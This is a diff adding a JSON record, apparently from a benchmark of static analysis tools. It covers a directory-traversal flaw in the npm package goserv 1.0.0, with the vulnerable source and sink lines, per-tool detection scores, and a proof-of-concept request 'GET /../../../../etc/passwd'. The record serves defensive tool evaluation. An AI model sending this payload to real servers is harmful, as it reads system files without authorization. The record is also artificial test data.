@@ -1,0 +1,64 @@
+{
+    "advisory": {
+        "id": "GHSA-pwqj-h62h-q35c",
+        "cwe": "CWE-22"
+    },
+    "correct_cwe": "CWE-22",
+    "correct_package_link": "https://registry.npmjs.org/goserv/-/goserv-1.0.0.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "lib/goserv.js",
+                    "lineno": 30,
+                    "code": "http.createServer(function(request, response) {"
+                },
+                "sink": {
+                    "file": "lib/goserv.js",
+                    "lineno": 63,
+                    "code": " fs.readFile(filename, \"binary\", function(err, file) {"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "url": "https://github.com/JacksonGL/NPM-Vuln-PoC/tree/master/directory-traversal/goserv"
+        },
+        {
+            "code": "GET /../../../../../../../../../../etc/passwd HTTP/1.1\nhost:foo"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "A"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "B"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "B"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "D"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "D"
+        },
+        "odgen": {
+            "score": "C"
+        }
+    }
+}
